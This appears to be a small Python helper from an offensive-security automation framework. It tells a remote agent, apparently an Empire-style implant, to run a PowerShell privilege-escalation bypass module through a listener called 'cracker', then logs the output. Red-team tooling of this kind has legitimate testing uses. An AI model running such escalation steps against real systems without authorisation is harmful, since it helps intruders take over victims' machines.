async def crystallize(agent, listener="cracker"):
    output = await agent.execute(
        "powershell/privesc/bypass", options={"Listener": listener}
    )

    results = output["results"].strip()
    log.debug(results)
    return results